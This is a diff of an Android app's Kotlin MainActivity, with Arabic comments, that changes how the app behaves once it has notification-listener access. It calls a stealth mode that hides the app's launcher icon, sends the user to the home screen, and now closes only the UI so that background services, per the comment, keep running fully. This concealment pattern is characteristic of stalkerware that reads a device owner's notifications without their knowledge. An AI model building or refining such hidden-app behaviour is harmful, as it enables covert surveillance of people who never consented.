@@ -66,24 +66,23 @@ class MainActivity : ComponentActivity(), TextToSpeech.OnInitListener {
         }
     }
 
-    // 🌟 التنفيذ الفوري لقتل العملية وتحديث اللانشر عند العودة من صفحة الإعدادات
+    // 🌟 التعديل المطلوب: الخروج للشاشة الرئيسية وإغفاء الواجهة فقط بدون قتل عملية التطبيق
     override fun onResume() {
         super.onResume()
         
         if (isNotificationListenerEnabled(this)) {
-            // 1️⃣ تعطيل الـ LauncherAlias
+            // 1️⃣ إخفاء أيقونة التطبيق من اللانشر
             StealthUtils.switchToStealthMode(this)
 
-            // 2️⃣ الخروج للشاشة الرئيسية
+            // 2️⃣ الرجوع للشاشة الرئيسية
             val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                 addCategory(Intent.CATEGORY_HOME)
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
             startActivity(homeIntent)
 
-            // 3️⃣ إغلاق كافة الأنشطة وقتل العملية فوراً لإجبار اللانشر على مسح الأيقونة
-            finishAffinity()
-            android.os.Process.killProcess(android.os.Process.myPid())
+            // 3️⃣ إنهاء الشاشة فقط لتغلق الواجهة مع الإبقاء على خدمات الخلفية تعمل بالكامل
+            finish()
         }
     }
 
